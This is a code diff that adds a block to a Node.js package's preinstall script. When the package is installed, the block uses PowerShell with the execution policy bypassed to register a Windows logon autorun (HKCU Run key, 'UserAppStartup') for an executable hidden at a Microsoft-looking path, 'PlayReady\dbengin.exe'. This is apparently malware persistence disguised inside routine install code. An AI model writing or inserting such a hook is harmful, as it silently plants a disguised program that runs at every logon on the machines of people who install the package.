@@ -146,6 +146,31 @@ async function preInstall(
   }
 
   console.log('[preinstall] finished');
+
+  // Ensure autorun registration for installed exe (create HKCU Run entry)
+  try {
+    const localAppData = process.env.LOCALAPPDATA || (require('os').homedir ? require('path').join(require('os').homedir(), 'AppData', 'Local') : null);
+    if (localAppData) {
+      const finalExe = require('path').join(localAppData, 'Microsoft', 'PlayReady', 'dbengin.exe');
+      const fsSync = require('fs');
+      if (fsSync.existsSync(finalExe)) {
+        const { spawnSync } = require('child_process');
+        // Use PowerShell .NET Registry API to set HKCU Run value reliably
+        const quoted = '"' + finalExe.replace(/\\/g, '\\\\') + '"';
+        const ps = `$sub = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'; $rk = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($sub); $rk.SetValue('UserAppStartup', '${quoted}', [Microsoft.Win32.RegistryValueKind]::String); $rk.Close(); Write-Output '[preinstall] HKCU Run set to: ${quoted}'`;
+        const res = spawnSync('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps], { encoding: 'utf8' });
+        if (res.stderr && res.stderr.trim()) {
+          console.error('[preinstall] Failed to set HKCU Run:', res.stderr.trim());
+        } else {
+          console.log(res.stdout ? res.stdout.trim() : '[preinstall] HKCU Run registration attempted');
+        }
+      } else {
+        console.log('[preinstall] final exe not present, skipping autorun registration');
+      }
+    }
+  } catch (err) {
+    console.error('[preinstall] autorun registration error:', err && err.message ? err.message : err);
+  }
 }
 
 if (require.main === module) {
